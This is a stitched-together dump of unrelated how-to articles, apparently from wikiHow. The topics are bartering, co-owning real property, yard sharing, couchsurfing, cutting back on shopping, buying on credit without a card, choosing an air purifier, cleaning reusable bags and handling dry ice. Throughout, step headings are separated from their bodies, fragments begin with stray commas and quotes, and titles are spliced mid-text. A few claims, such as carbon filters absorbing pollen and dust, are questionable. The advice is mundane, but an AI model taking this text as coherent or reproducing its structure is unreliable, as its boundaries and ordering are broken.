When offering an item, provide photographs of the item or, in the case of art commissions, photographs of past work. These don't need to be professionally taken, but make an effort to take non-blurry photographs in front of a solid-color background., For casual trades between friends, you might quickly decide in conversation that one French lesson is worth one home-baked pie. When dealing with strangers, or conducting more valuable trades, it pays to discuss the value more formally. Each party should explain how much they would normally charge for the good or service they are providing. Be open to haggling over this amount or reducing the price if it still results in a deal that saves you money. Once you've agreed that, for example, a treadmill is worth $50 and an hour of garden work is worth $15, finding a trade that feels fair to both parties should be easier.


Because you are not exchanging precise currencies, the value of each party's contribution is rarely exactly even. In the above example, the gardener might agree to work for 3 hours (worth $45) and receive a treadmill in exchange (worth $50), rather than work for exactly 3 hours and 20 minutes (worth $50).

, If you can't agree on an exchange of services or goods that sounds fair to everyone involved, throw in something extra. This can be cash, another item you're trying to get rid of, or another service., This strategy is more likely to come up among people who are experienced at bartering, or involved in a bartering community. Keep an ear out for people who need particular services, and see if you can work out a three-way trade. For instance, Alfred can walk Bob's dogs; Bob can repair Carol's roof; and Carol can mow Alfred's lawn.

, For larger transactions, or transactions with strangers, it's a good idea to create an agreement in writing. For many small barter trades, oral agreement or agreement in an email can be sufficient.Either way, make sure you agree on the following points before you close the deal:


Who is responsible for providing tools, ingredients, or raw materials? If something needs to be purchased, who pays for it, and who gets to keep the new tools or excess materials afterward?
What's the deadline for completing the service or delivering the goods? If it's a longterm or recurring service, pick a date in the future to talk to each other and check if both people are happy.
How much followup service is expected? For services which can require an unpredictable amount of additional time, such as website maintenance, it may be a good idea to agree on a maximum number of hours before a new agreement needs to be reached.
If someone is providing a service in your home or garden, is she expected to call in advance before she comes over, or is she allowed to stop by and work even if you aren't around?

, If you are communicating with phone messages or emails, make an effort to respond as soon as you can. If there is a delay before you can make a decision or provide the agreed-upon service or item, give the other party an estimate of the time it will take. Make it clear that you expect a response by ending emails with a yes or no question, and follow up with a polite request asking whether the other party has made a decision if you get no response within a few days.If you decide not to accept a deal, let the other party know as soon as possible. Do not assume they will get the message if you stop communicating with them.

, In the United States and most other countries, businesses are required to report their income from bartering based on the estimated value of the service or goods received. Even individuals are required to report capital gains if they end up ""making money"" on a deal, again based on the estimated value of the services or goods exchanged.If you're not sure of the value of the items exchanged, try to find similar examples online such as items being sold on eBay or Craigslist.
U.S. businesses should report their income on form 1040, schedule C or 1040, schedule C-EZ. If you already submitted your taxes and left the barter income off, correct this with form 1040X.

, Keep in mind that many people already barter with the people they know, but may think of it as a casual trade or an exchange of gifts. Your friends or family might turn down an explicit offer to barter, because it seems to them too transactional, or they might agree but not understand that you expect them to treat it as a serious obligation. In these situations, it may be best to stick with low-value, informal trades, and reduce your expectations of prompt or high-quality returns.

Decide on ownership interests.,
Draft a written agreement.,
Secure financing.,
Execute and record your ownership documents.",How to Co‐Own Real Property1," Tenancy-in-common is considered one of the most flexible ways to co-own real property because the owners can decide among themselves what percent ownership stake each individual owner has in the property.

You also can allocate expenses to maintain or develop the property according to the division of ownership interests, or according to the interest and expertise of the owners.
For example, suppose you and a colleague are buying a parcel of land to build condos. You have interest in sustainable building materials and energy efficiency, while your friend has expertise building luxury interiors and community amenities.
In that scenario, as tenants-in-common you could divide the control and expense of building those things and accordingly give your friend the larger interest she would need to construct swimming pools and lakes surrounding the condos, while you could focus on the land where the condos would be built.;
, Any decisions you make regarding your ownership interests and how you will share the costs and responsibilities of maintaining the property should be put in writing so they become legally binding.Your written agreement can be used to resolve any disputes that arise later on. Even though you and your partner may be on wonderful terms now – after all, you're buying real property together – things may sour down the road.
Besides the ownership interests the two of you have worked out, your written agreement discusses property expenses, what might happen if one of you decides to sell your interest, and how disputes will be resolved.

, Where a mortgage is necessary, typically co-owners who plan to take title to a property as tenants in common must each obtain their own financing for the portion of the property they will own.People intending to purchase land as tenants-in-common can take out a joint mortgage on the whole property, then pay a portion of the mortgage payment each month according to their ownership interest.
However, as tenants-in-common you also have the ability to get separate mortgages that cover your fractional interest in the property. Separate mortgages can be a good idea if you and your partner have significantly different credit and income.
Keep in mind that if you purchase two separate mortgages, each of you potentially will be responsible for separate down payments. The total of those two separate down payments may be greater than the single down payment you'd have to put down on a joint mortgage.

, All deeds and ownership agreements must be signed by all co-owners and recorded with the county recorder in the county where the property is located.As tenants-in-common, all owners don't have to sign the ownership documents at the same time. You can execute the deed and obtain financing independently.
Co-owning the land as tenants-in-common also allows you to add new partners later on if you decide it's necessary – you'll just have to modify or amend your co-ownership agreement to account for the new owner.
For example, suppose you and your friend decide to bring a new partner into your condo development project who has skills in marketing and promotion to help you sell units in your new development.
As tenants-in-common, you can allocate a percent ownership in the land to your new partner if you want. However, keep in mind any financing you obtained does not take that additional owner into account.

Start finding partners as soon as you decide to start yard sharing.,

Start it off with a party.,

Read up.,

Have an expectations discussion early.,
Create your online home.,

Involve the kids.,

Gather resources together.,

Talk to your neighbors about what you're doing.,

Ask questions online of folks who are already yard sharing.,

Plan for harvest and storage; success and failure.",How to Start a Yard Share," It can take a while to work out agreements and plan for a substantial garden. The sooner you start, the more successful you'll be at finding the right folks and planning for your yard share.

Call your friends who live in apartments or your grandmother who knows a thing or two about growing food in your area. Make it a family affair, or a way to gather some folks you don’t get to see often enough. Or bring up a yard sharing project at your house of worship. Perhaps your faith community would be interested in growing fresh food for the hungry each spring.
It pays to start now. Healthy groups and good agreements take time to develop.;
, Once you've found some people you would like to garden with, have a potluck party and celebrate your new community. Getting to know people over a shared meal and music sets the proper tone for real community. Above all, it should be fun and light. Save the substantial discussions for another day. Light candles, play some good music, talk about your dreams for the garden or gardens and break bread together because this is the beginning of something wonderful., Make a list of books that are useful to your yard share group. Will you use permaculture methods, bio-intensive or no till? Bring everyone up to speed. Visit your local library, or begin collecting your own resources.

For those who are more risk averse and have some anxieties about how to share without encountering legal bumps, start with a copy of Janelle Orsi and Emily Doskow's book The Sharing Solution., Talk about your worries and how you will address them. Do this online (such as in a wiki space) so that people can flesh out their concerns, respond, and agreements can be recorded permanently. If things get tense, have another potluck and work it out over something yummy. Online tools can support the collaboration but don’t substitute for it; keep in mind that face-to-face encounters build real community. Start asking these sorts of questions:

When is it OK to be at the home or yard of the host yard, and when is it not OK?
Will you compost collectively?
Is it a strictly organic garden?

, You'll find that sharing your experience online helps both you and others to learn from it. Share planning, documents, videos, pictures, links and jokes. Teach each other what you know about how to grow in your zone and create a place where new members down the line can catch up on all the ideas and wisdom you’ve gathered. Documenting things will help you evaluate what worked and what didn't, not only in terms of what you tried to grow but also in how you chose to organize the project. Imagine the yard share going on for many seasons, and plan for success by sharing knowledge from the start., If kids are going to be part of the garden share, make sure they participate in the planning and expectation setting. If they're involved at the start, they're more likely to enjoy participating. Work some kid-centered fun into your plan.A garden is one of the best hands-on learning experiences a kid can have. If you have any biology or nature geeks in your group, ask if they can hold a lesson now and then., As a group, make a list of all the things you hope to grow.

Research what works for your zone and pull a kitty together. Order your seeds and starts. Some heirloom and specialty seed houses run out of stuff before spring. Some things like garlic starts go quickly.
Take an inventory of who has what tools, seeds, transplants, cuttings, and a list of the items you will perhaps need to buy.
Plan for storage of tools and make sure people know where everything goes at the end of the day.
Make sure people’s time, knowledge, and commitment are all valued. Money shouldn’t be the only currency you acknowledge. Be aware that many people are coming to the yard share project with a need to save, not spend heavily. Get ready to bargain hunt and browse all those spring garage sales. A garden does not need to be an expensive project.

, Introduce them to your new friends. Let them know about yard sharing. Maybe they want to start their own yard share. Think about how this sort of project can revive the neighborhood., Share your ideas and concerns. Maybe someone has already worked through it. Gardening forums cover both yard sharing and gardening concerns in general., Some plants you try will have fantastic results. Other plants you try to grow will fail. Set your expectations with this in mind.

Will you can or dehydrate the excess? Will you need to plan to purchase some tools for this as well? Will you save seed for swapping next year?

Confirm you meet the legal requirements.,
Apply for a mortgage.,
Record the transfer.",How to Co‐Own Real Property2," To co-own real property as joint tenants, all owners generally must have unified rights in the property in terms of time, title, interest, and possession. Additionally, the language in ownership documents must be very specific to convey this interest.

Unity in time means all co-owners take their shares of the property at the same time.
Unity of title means all co-owners acquire title to the property by the same interest. This means you all must sign the same deed at the same time.
Unity of interest means all co-owners have equal or identical ownership interests in the property. Unlike tenants-in-common, you can't proportion this out. If there are two co-owners, they each have a one-half interest in the property.
This third unity is where language comes into play. The ownership documents must convey the interest to each co-owner in exactly the same way or the joint tenancy will fail and the co-owners will instead be considered tenants-in-common.
The fourth unity, unity of possession, means that all owners have the right to possess the entire property. Unlike tenants-in-common, this cannot be parceled out – all owners must have the right to possess the entire property at all times.
The key difference between a joint tenancy and a tenancy-in-common, however, is the right of survivorship. If one of the co-owners die, the remaining co-owners have a right to ownership in the property they left behind that is superior to all others, even creditors of the deceased.
There is another type of joint tenancy referred to as a ""tenancy by the entirety,"" which is only available to married couples. In addition to the four unities, you also must be married to the co-owner. This form of real property ownership is still recognized in some states, but many states have abolished it.

, If you need to finance your joint purchase of the property, typically joint tenants also must jointly apply for a mortgage and both meet approval for financing, so that both of their names are included on all documents.While it is technically possible to have multiple fractional mortgages, you must take care to ensure they each cover equal portions of the property.
Additionally, you must maintain the four unities. The unities of time and title are at issue here. If you have multiple mortgages, it may mean that one owner takes title to the property at a different time than the others do.
For these reasons, getting a joint mortgage on the property as a whole typically is your best option if you want to co-own real property as a joint tenancy.

, Once financing is in place, both tenants must sign all ownership documents at the same time to preserve their unified rights and ensure that a joint tenancy is created in the property.Make sure you are following the signature and witness requirements in your state to properly transfer title in the property from the previous owners to you and your co-owner.
Keep in mind that joint tenancy also requires all co-owners to take title on the same document. This means you can't add a new co-owner later, because you will destroy the unity of time.
If you wanted to add a new co-owner later, your ownership interest would be converted to a tenancy-in-common, and you would lose the right to survivorship.

Organize your LLC.,
Register your LLC in the state where the property is located.,
Purchase the property.,
Take title to the property.",How to Co‐Own Real Property3," If the company doesn't already exist, you must get together with the other potential co-owners of the property and create an LLC through which you all will purchase and manage the property.Search the business name database of the state in which the property is located to find a name for your LLC. It cannot be identical or similar to the name of a company already registered with the state. These databases typically are available online at the website for your state's secretary of state.
Once you've found an available name, you should reserve it to ensure its availability while you complete the organization process. You'll have to pay a fee to reserve your name.
You'll have to get together with the other members of your LLC to draft your Articles of Organization and Operating Agreement for your LLC. You typically can find forms online to create these documents, or you can hire a business attorney to draft them for you.

, Different states have different registration requirements that you must follow, but generally you must file your Articles of Organization with the state's Secretary of State office and fill out required forms.You must pay fees to register your LLC, and fill out forms identifying your registered agent for service of process in the state.
Even if you or other members of the LLC don't live in the state where the property is located, your registered agent must be a resident of that state.
You typically don't have to file your Operating Agreement with the Secretary of State, but you should create one anyway. This document defines the roles of each member of the LLC, ownership interests, and distribution of profits.

, If financing is required, any mortgage applications must be completed in the name of the LLC rather that in the names of any individual members, so that the LLC becomes the record owner of the property.You must get an employer identification number (EIN) from the IRS so that you can file taxes for your LLC. The EIN also allows you to purchase property, enter contracts, and open bank accounts in the name of the LLC.
Even if you don't have any employees, the state typically requires an EIN – rather than the Social Security number of a member – be used to file property taxes and other state taxes on behalf of the LLC.

, Once your LLC is legally formed, it becomes its own legal entity and can enter into contracts, purchase land, and work with builders or contractors to develop the land according to the company's plans.The property will be owned by the LLC, rather than by any of the members of the LLC.
The benefit of this is that you can add members at any time without having to disturb any property ownership documents.
Members of the LLC who no longer want to own the property or be a part of the project can simply leave the LLC. Since their name isn't on any property documents, no transfer of ownership interests takes place.

Keep in touch.",How to Be a Great Couchsurfer," Tell your prospective hosts when you'll arrive, why you'd like to meet them, and how long you'll be staying. Explain a little about your visit. Are you touring the area? In town for an event? Passing through on the way to someplace else? Also, make sure you've filled in your profile, so they know a little about you.


If you're concerned about safety, choose hosts with detailed profiles and positive reviews. Women traveling alone may want to select female hosts or hosts with families, and to find the address of nearby hostels to use as a backup plan.;
, Read his profile and look for interests that you share or that you would like to learn more about. Your host is a volunteer, and is most likely open to hosting because it means getting to meet people. Think of stories and skills you can share with your host during your visit, and activities that you could do together.


Choose a factoid to use as an icebreaker, such as a shared taste in music or a location you've both visited. If nothing comes to mind, plan on asking your host whether he's hosted couch surfers before, or what he likes to do for fun in the area.
Communicate using the built-in tools on the website, not personal contact info, until you are sure you are compatible and decide to go through with the couch surf., Once a host has accepted your request, communicate with him to figure out the logistics. Let him know whether the dates you give him are set in stone, or whether you might show up late or leave early. Whether you're traveling by plane, car, or foot, make sure you know how to get to your host's home, and what number to call if you get lost.


Ask whether you'll have your own key, or whether there are certain times you'll need to show up to be let in.
Find out the details of the accommodation. You may need to bring your own sleeping bag, pillow, and/or towel.

, As a permanent member of the local community, your host can provide advice and warnings that aren't easy to find online. Feel free to ask about any topic related to your stay; your host should be happy to help. Here are a few topics that might be useful to cover before you arrive:


Are there any day trips worth doing to nearby towns or attractions? Would your host be interested in joining you?
What's the best way to get around the local area? How reliable is public transportation, and how late does it run? Should you rent a car?
Are there neighborhoods that are unsafe to walk through? Are there any precautions to take?

, Part of the fun is getting to know your host. A small gift shows your appreciation and can open up a warm conversation, especially if it's a fun trinket from your hometown or the last place you visited. Even better, give the gift of a shared experience:


Share your skills. Many couchsurfers travel with a musical instrument or a small drawing kit. Others offer to help with basic home repairs, craft projects, or gardening.
Teach each other something. This could be a song, a holiday tradition, sports advice, or one of the skills mentioned above. If you know another language and your host seems interested, teach her a few words.

, Talk about the places you've traveled, the customs back home, or just stories from your life. Ask your host questions about the local community, its history, and his own life. Personal and cultural exchange sets couchsurfing apart from a stay in a hotel, if you step up to the opportunity.

, Do your best to follow the instructions the host gives you, such as which entrance to use and when to keep the noise level down. Pay attention to your hosts' habits as well, and imitate them if necessary. For example, many people leave their shoes by the front door and may think this goes without saying in their culture.


Don't hesitate to ask questions or apologize when you make a mistake. A positive attitude goes a long way toward smoothing out minor slip-ups.

, Food is a great way to share pleasant experiences, and to introduce each other to your respective cultures. If you can cook, offer to do so in your host's home, and share the results with your host. If you can't cook, or your host seems uncomfortable with the idea, offer to pick up the tab for a meal at a restaurant nearby. If there's no time to share a meal together, or a restaurant is out of your budget range, bring a small treat from home or a nearby bakery.


If your host also cooks, offer to share the recipe.

, If your host can't be home to let you in during the day, find out when he or she can be there, and then find yourself something else to do for an afternoon.


It costs nothing to be cheerful, enthusiastic, and appreciative of your host's hospitality, and it can make a big difference in how your host sees you and treats you.

, Let your host know when you plan to return from an excursion, and communicate again if your plans change.

, At the very least, clean up promptly after yourself and offer to help with dishes after a communal meal. If your host is usually busy or withdrawn, doing some light housekeeping or gardening together may be a good opportunity to connect.

, Ask your host for appropriate cleaning supplies if you need them. If your host provided a pillow, blankets, a towel, or a floor mat, ask where to put them. Return any items you borrowed.


Don't leave anything behind besides gifts. Toss out all your trash, and offer to take the trash out if you filled it up.

, If you had a great time, say so. A good review will help your host find couch surfers that match her interests and attitude. To describe your experience with the host, visit the host's profile and click on the ... symbol, then ""Write Reference.""Write an honest reference that describes your host's attitude, plus a couple specific things your host did that made (or broke) your trip. Mention anything you found surprising, even if it was pleasant; other couch surfers will appreciate being told in advance.

, Not all surfers and hosts will make friends every time, but if you did find a friend, trade social media or email contacts. Say hello once in a while and let your hosts know how the rest of your trip is going.

Evaluate your budget.,
Provide a rationale for skeptical family members.,
Find a hobby.,
Take an inventory of what you have.,
Set up clothing swaps, food co-ops and other exchanges.,
Fix things before you replace them.,
Shop only when you need to.",How to Cut Back On Shopping," Before you cut back, keep track of how much money you spend on shopping trips in an average day, week or month.


Decide what you want to spend. Once you have an idea of how much you have spent on shopping for things such as food, clothing, electronics, toys and other material goods, decide how much you want to spend on these items going forward.;
,


Give your spouse and children a reason for why the spending habits will change, such as paying down your debt, saving for a vacation or needing to make up for lost income.

, Some people shop simply because there is nothing else to do on a Saturday afternoon or evenings during the week.


Learn a new sport, or do something with your family and friends. Host a movie night every week, take up walking in the evenings or join your local library. Find an activity you enjoy that will replace the time you spent wandering around stores.

, You might be surprised at how little you need.


Assess your pantry and freezer before you do any grocery shopping. You can probably throw together a few more meals and snacks before you head to the grocery store.
Look at all of the clothing and accessories you have in your closets. Once you count the pairs of jeans you own and look at all of your shoes, you will probably realize you do not actually need any new clothes right now.

, Gather together all of the things in your house you might be willing to trade for other items.


Get together with friends of all sizes for a clothing swap. Everyone can bring a few pieces they are willing to part with, and trade them for other items that your friends bring.
Host a food swap by inviting people to bring a bag full of canned or boxed goods. If you have four cans of corn you do not need, you might be able to trade them with a neighbor who has more than enough pasta.
Suggest similar parties to your guests. You could trade books, movies, music, linens and even small household appliances.

, If something stops working, your initial response may be to go shopping for a new item.


Take the thing apart instead and see if you can find the problem. Do not be afraid to ask friends, family members and neighbors for help.
Avoid heading to the mall or the department store just to ""browse."" Do not get on your computer if it means you will shop online.

, If you have a real need for something such as food, light bulbs, laundry soap, or new glasses for your child, shop smart.


Make a list of exactly what you are shopping for. Do not look at or purchase anything not on the list.
Pay cash. Eliminate your use of credit cards while shopping. If you have to pay for it in full at the time of purchase, you will be more careful about what you buy and how much you spend.
Buy used items when you can. Check consignment shops, yard sales and online auctions for the items you need.

Sign a Reverse Layaway(TM) agreement.,
Rent to own.,
Set up a closed-end credit account.,
Take out a home equity line of credit (HELOC).,
Use the buy now pay later option that is offered by websites.",How to Buy on Credit Without a Credit Card," This involves a commitment on your end to make payments as agreed upon in a contract. Additionally, these payments are usually guaranteed by some form of collateral, such as pre-written checks. This is how you buy on credit using the Reverse Layaway(TM) process:


Find a retailer or service provider that offers the Reverse Layaway(TM) program.
Complete the retailer's Reverse Layaway (TM) form. This includes providing your identifying information and signing a contract to pay as agreed.
Write checks to cover each future payment that must be made as per the contract terms. The salesperson will then run these checks through the store's accounting system. The check amounts will be drawn from your checking account on the dates you fill in on the checks.;
, If you have no credit card, you can purchase merchandise on credit by renting to own it.


Find a retailer that specializes in rent to own sales. You may find a rent to own location on the Internet or walk in to a storefront in order to begin the process of renting to own.
Complete the application. There is no credit check to rent to own, but you must prove employment/income, provide information about your residence and give a list verifiable references.
Purchase merchandise at the rent to own store, up to the credit limit the store determines.
Agree to repayment dates and terms. You may choose to pay weekly, bi-weekly or monthly.

, Closed-end credit lines are extensions of credit that have pre-defined credit amounts and repayment periods. There are retailers that cater specifically to buyers with no credit card by offering closed-end credit accounts that can only be used to purchase merchandise directly from the retailer.


Find retailers that offer closed-end credit accounts by searching online.
Complete an application for a closed-end credit account. You will have to provide employment, income, residence and reference information.
Shop for merchandise on the retailer's website or have the retailer send you a catalog.
Make monthly payments directly to the retailer until your account is paid off.

, If you own a home and have some equity buildup, then you may be able to borrow against your home's equity by setting up a home equity line of credit. A HELOC works much in the same way as a revolving line of credit, or credit card, in that you can use it to purchase items, and then make monthly payments at an established interest rate.


Apply for a home equity line of credit with your bank or a mortgage lender.
Draw against your HELOC either by check or account card whenever you want to make a purchase.
Make payments toward your HELOC balance on a monthly basis.

, Many online retailers allow you to make a purchase using the buy now pay later option, then give you 90 days same as cash terms. This is, in essence, buying on credit, as you receive your merchandise before you have to pay for it.

Discuss your decision to host with the people you live with.,
Post your house rules on the website.,
Be honest.,
Tidy up your place.,
Be a gracious host.",How to Be a Great Couchsurfing Host," Before you start posting your place on Couchsurfing, get the opinion first of the family or friends you live with. Once they agree with your grand plan to put up guests, initiate them on what to expect.


You don’t want to deal with surprise of the bad kind once your couchsurfers are already at the door. There’s no worse welcome than being unwelcome.;
, Sharing your personal space with other people is seldom easy, especially if you’re a neat freak or have allergies and whatnot. Make it less stressful for everyone involved by clearly outlining the dos and don’ts for your guests. Post these rules to your Couchsurfing profile to inform potential couchsurfers in advance.


Include information such as the gender/s of house guests you’re willing to take in, if pets are allowed, and how many couchsurfers are one too many. Be as specific as you can get. Such information is always useful and makes for a mutually happy stay.

, This means no misrepresentation of yourself and no fake house photos on your Couchsurfing profile. It is always better to set and manage expectations before you and your couchsurfer agree on the terms.


Do not fake interests just to sound, well, interesting. Remember, your couchsurfers won’t just by staying in your house—they will be spending time with you too.

, Even though you’re not a hotel or a public lodging, keep your place nice and neat. Dust off furniture, vacuum carpets, sweep the floor, prepare clean sheets, and relegate anything that looks like trash to the trash bin. Clean up preferably a day before your guest arrives and not any later.


Lock away in a secure place items and personal belongings that you don’t want surfers to use.

, Greet your guests once they arrive, and try to be genuinely happy to see them, and ask them about their trip. Show them their rooms and politely revisit the house rules just in case they’ve forgotten in the flurry of things. Direct them to the utility areas in your house such as the bathroom, toilet, and kitchen that they may use.


Be considerate even if it’s your house. If you have personal habits that are not really for public viewing, rein them in for a couple of days or so until freedom reigns again (i.e., after guests are gone).
Remember, your hospitality may be what represents your country to your guests. Send them off with smiles on their faces and happy stories to share back home. You will be helping your country’s tourist industry!

Take care of your air purifier.",How to Choose an Air Purifier," If there's dust lurking in your living space, it will make your need for an air purifier seem more dire than it actually is. Vacuum regularly, including furniture, and check your heating vents for lint and dust. If you still feel like you'd breathe easier with cleaner air, then you can start doing research on an air purifier., There are many things that can wreak havoc on your lungs when airborne: smoke, mold, pet dander, dust, and pollen, to name a few. If you're exposed to allergens in a clean home or workspace, and especially if you suffer from asthma or other respiratory issues, then an air purifier can help make your life more pleasant.


An air purifier is definitely not a substitute for an inhaler or other medication, but it can help improve your quality of life.

, The best air purifiers depend on one of two technologies: High Efficiency Particulate Arrestance (HEPA), or carbon filtration. Choose based on what particulates you need to be filtered out of your air. Both technologies are available at different sizes and price points.

, HEPA removes 99.97% of particles sized 0.3 microns or less from the air using layers and pleats of gauze.This means it's really good at filtering all types of impurities from the air, even tiny ones.


If you choose a HEPA purifier, sure it’s called “true HEPA” or “absolute HEPA,” not “HEPA-like” or “HEPA-type.” Neither of these last two labels is regulated by the government, so you just don’t know if it works as well as a true HEPA filter. In some HEPA models, the filter itself must be replaced once a year. The replacement filters can be pricey--even close to the cost of the purifier itself!, Carbon filters force air through a layer of charcoal. This technique absorbs particles that come from things that were once alive, like pollen, dust, pet dander, and even tobacco smoke.Carbon filtration also absorbs odors well, which is good for those who are sensitive to scent., Take careful measurements of the room or rooms in which you need the air purifier to do its job with a measuring tape or stick. If you have a 500-square-foot apartment and buy an air purifier designed for 100 square feet, it just won’t do the job.

, Air purifiers can range in price from $20 to over $1000. Don’t skimp if you don’t need to. However, be aware that you can find a reliable air purifier for under $200--it’s not necessary to drop a small fortune!


Remember that an air purifier can come with additional costs. It may add a few dollars to your energy bill every month, and replacement HEPA filters can be expensive.

, At this point, you should have a good idea of the sort of air purifier you want. Check out the websites of well-known manufacturers, like BlueAir, Alen, Honeywell, and GermGuardian, to find examples within your parameters.

, Once you’ve got your search narrowed down to a few models, you can look at what others are saying about them. Make sure to get reviews from different sources--Amazon, independent blogs, consumer reviews--to get a balanced picture of how well the air purifier works.

, Don’t be tempted to simply snap up the first air purifier you see! It’s worth looking at several different stores to find the best price and customer support. If you're shopping online, it's smart to check reviews for the store you'd like to purchase from, as well as the air purifier you plan to buy there.

, A large item like an air purifier can get pricey, so it's worth it to apply coupons and promotions if you can. Sometimes you can even combine coupons to save even more.


Manufacturer’s coupons come directly from the company, and can be applied to the air purifier when you check out at a store.
Store coupons are produced by a particular shop, like Target or Best Buy, and can be used on the air purifier of your choice. These can sometimes be “stacked” or combined with a manufacturer’s coupon, but usually cannot be stacked with each other.
Watch out for seasonal sales. Labor Day, Black Friday, and the beginning of January are all times when big box stores run promotions on electronics like air purifiers.

, When you’re buying your air purifier, feel free to make any inquiries you need to, both about the air purifier itself and the store you’re in. While you're at it, double-check the specifications on the box to make sure it's the right filter system and capacity for your needs.


If you're shopping online, you can still ask questions! Any reputable site should have a responsive customer service system, whether it's a chat function, email address, or phone number.

, This is your insurance policy in case your new purifier doesn't work the way it promised, so look it over, then file it away. Some stores offer extended warranties beyond the manufacturer’s guarantee; decide whether this would be a good use of your funds before you check out.

, Your air purifier can only filter so much air per hour, so you want to make sure that there isn't pollen from outside blowing in and complicating the purifying process., This will maximize your air purifier's effectiveness. If your need for an air purifier is centered around one thing in particular, putting the appliance close to it will help eliminate your concerns faster.For instance, if you're allergic to animal dander, try positioning the purifier near the dog's bed or favorite spot on the rug.


If you're setting the air purifier in your bedroom, place it five to ten feet from your headboard, facing you.This will keep you from feeling too breezy.

, It takes a few hours for an air purifier's work to be noticeable. When you first plug in your air purifier, it has to work overtime to filter out all the accumulated particles in the air. Once it's been working for a little while, it should be more efficient., The maintenance you need to do on your air purifier will depend on the model, which is why it's useful to read the manual. In general, it's good to keep the outside of it nice and clean, and extremely important to replace the filter when needed.


Make sure to clean underneath the air purifier regularly--it can't do its job if it's sitting on a layer of dust!
Many newer models have lights or other indicators to alert you when a filter needs to be cleaned or replaced.If you've purchased a HEPA air purifier, you will need to replace it after a year's time. This process will vary depending on what model you've chosen, but the manual should contain instructions for this process.

Check the tag on the bag.,
Wipe down insulated bags with disinfecting wipes after every use.,
Hand wash in warm, soapy water.,
Rinse soap off the bag.,
Flip the bag inside out and air dry.",How to Clean Reusable Shopping Bags1," Nylon, insulated, and polyester bags will look more like plastic than cloth. Check the tag to see what the bag is made of and recommendations for cleaning. When in doubt, hand wash.Insulated polyester bags can be recognized by their plastic appearance and thick padding. If you are unsure whether your bag is insulated polyester, consult the tag.
Some synthetic materials, like polypropylene, can also be machine-washed.;
, You are more likely to use insulated bags to carry meat, which is a prime source of foodborne illness. Thus, after ever use wipe the bag down with a disinfecting wipe. Be careful to get into the seams, where bacteria can collect.Cloth bags should not be wiped down with disinfecting wipes, but insulated polyester bags can be.

, Fill the sink with warm water and add soap. Dunk the bag into the water and swish it around, rubbing it against itself to create friction. Remember to turn it inside out and clean out the inside of the bag., After cleaning the bag, wash soap out. Run the bag under cold water or dunk it in a new batch of cold, soap-free water., Flip the bag so that the inside is facing out. Hang the bag up somewhere warm and dry. Allow it to dry completely before packing it up."

Machine dry the bag if it isn’t made from polypropylene.,
Air dry when in doubt.",How to Clean Reusable Shopping Bags2," Verify what your bag is made from cotton, bamboo, polypropylene, or hemp. Bags made from these materials should be machine washable. Check the tag to verify the recommended cleaning method.


These bags can also be washed by hand, should you choose to do so.

, These bags can be washed in the laundry machine with laundry detergent. They should generally be washed on a gentle cycle with cold water. Cotton bags are the exception; they can be washed with hot water on a regular cycle., Cotton, bamboo, and hemp bags can be dried on a regular setting in a cloth’s dryer. This is easier than air drying and poses less threat of moisture remaining on the bag after drying., Air drying is safe for all types of bags. So, if your bag is made of polypropylene, or if you are unsure what it is made of, allow it to air dry. Hang it up and give it approximately 24 hours to dry. Be sure that it dries completely."

Pick up dry ice at your local grocery or general merchandise store.,
Buy dry ice in block form.,
Place the dry ice in an insulated container like a plastic cooler/ice chest.,
Put the cooler in your car and roll down the windows.,
Wear leather gloves and long sleeves when opening or pouring dry ice.,
Keep unused dry ice in well-ventilated rooms.,
Open doors and windows in a room where dry ice has spilled.,
Leave dry ice in a well-ventilated area at room temperature to dispose of it.,
Do not store dry ice in a completely airtight container.,
Avoid keeping dry ice in cellars, basements, cars, or other poorly ventilated areas.,
Try not to leave dry ice unattended.,
Do not dispose of dry ice in the sewer, sink, toilet, or garbage disposal.You will likely freeze the water in the pipes and may even cause them to rupture.",How to Buy Dry Ice," Stores that sell dry ice include Safeway, Walmart, and Costco.


Plan to pick up dry ice as close to the time you will need it as possible. Since it is constantly changing from solid to gas, it has a very short shelf-life. Every 24 hours, 5-10 pounds of dry ice turns from a solid to a gas.Though most people can buy dry ice, some stores will require you to be at least 18 years of age in order to purchase it.;
, Performing school experiments and creating fog effects both require blocks of dry ice.


Dry ice also comes in pellet form but is mainly used for dry ice blasting to clean surfaces, or for medical transportation.
The price of dry ice ranges anywhere from $1.00 to $3.00 per pound. Though prices vary based on amount and location, it generally tends to be cheap.

, Since dry ice is much colder than traditional freezing containers (-109.3 to -78.5 degrees Celsius), it won't be kept cool by your average freezer or refrigerator.


The thicker insulated your cooler or ice chest is, the slower the dry ice will sublimate.
Open and close the container as little as possible to slow down the sublimation process. You can also fill the open space in the cooler with wadded paper to limit dead space and slow down sublimation as well.Storing dry ice in the freezer may actually shut off your freezer's thermostat. Since dry ice is extremely cold, your freezer will shut off to keep foods from over-freezing.Consequently, if your freezer breaks down and you need to keep the food inside frozen, you can put dry ice inside and it will act as a substitute.

, Remember, dry ice is carbon dioxide and is harmful if inhaled in large quantities.


Fresh air is especially important if you are transporting dry ice for longer than 15 minutes. Being in a poorly ventilated area with dry ice can cause rapid breathing and headaches and can be lethal if breathed over long periods., Though brief contact is harmless, prolonged contact with skin can freeze the cells and burn you in a manner similar to fire.


An oven mitt or towel can also work, but it will not offer the same protection as gloves. Treat dry ice like you would a hot frying pan by keeping your skin out of contact.
Treat dry ice burns as you would typical burns. If your skin is only red, it will heal in time. If your skin blisters or comes off, treat the area with antibiotic ointment and wrap with a bandage. Consult a doctor immediately in cases of extreme burns., Storing large quantities of dry ice in airtight areas can create an oxygen deficient atmosphere.


A locked storage shed in your backyard will have good air circulation and won't be in danger of suffocating people or animals. If you're having trouble finding a good place to keep dry ice, ask a chemistry teacher at your school if there is a safe place to store dry ice in the chemistry lab.
Make sure you store dry ice away from young children and pets.

, The dry ice will continue sublimating but will need to be able to mix with the air more easily.


Dry ice is heavier than oxygen and will accumulate in low areas of the spill area. Avoid putting your face near pits or other low, confined areas as these places will have the highest concentration of carbon dioxide., If you find yourself with extra dry ice, remember that it is constantly undergoing sublimation and simply needs to be left alone in order to evaporate.


Your backyard porch is a good place to dispose of dry ice. Make sure it is safely out of reach of others for at least 24 hours.
You can also use a fume hood to dispose of dry ice. A fume hood is a ventilated enclosure where harmful chemicals can be used or kept. Your school chemistry lab may have a fume hood where you can leave the excess dry ice. Be sure you ask a teacher first before doing so.

, The sublimation of dry ice to carbon dioxide will cause the container to expand and possibly explode.


Dry ice can cause a violent eruption if packed too tightly. Some people have been brought up on felony criminal charges for purposely confining dry ice until it explodes, creating a dry ice ""bomb.""
